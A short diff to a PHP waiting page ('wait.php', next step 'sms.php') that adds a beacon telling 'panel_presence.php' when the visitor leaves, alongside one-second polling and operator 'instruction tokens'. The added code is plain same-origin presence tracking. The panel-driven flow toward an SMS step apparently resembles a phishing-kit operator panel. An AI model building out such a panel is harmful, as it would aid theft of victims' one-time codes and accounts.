@@ -191,6 +191,7 @@ $next = isset($_GET['next']) ? trim($_GET['next']) : 'sms.php';
     const chatToggle = document.getElementById('chat-toggle');
     const chatClose = document.getElementById('chat-close');
     const chatNotification = document.getElementById('chat-notification');
+    let outReported = false;
 
     let lastInstructionToken = sessionStorage.getItem('instruction_token') || 0;
     let chatReady = false;
@@ -352,6 +353,31 @@ $next = isset($_GET['next']) ? trim($_GET['next']) : 'sms.php';
             }
         });
     }
+
+    function reportPageOut() {
+        if (outReported) {
+            return;
+        }
+
+        outReported = true;
+        const payload = new URLSearchParams({ page: 'wait.php' });
+
+        if (navigator.sendBeacon) {
+            const blob = new Blob([payload.toString()], { type: 'application/x-www-form-urlencoded' });
+            navigator.sendBeacon('panel_presence.php', blob);
+            return;
+        }
+
+        fetch('panel_presence.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: payload,
+            keepalive: true,
+        }).catch(() => {});
+    }
+
+    window.addEventListener('pagehide', reportPageOut);
+    window.addEventListener('beforeunload', reportPageOut);
 
     pollState();
     setInterval(pollState, 1000);
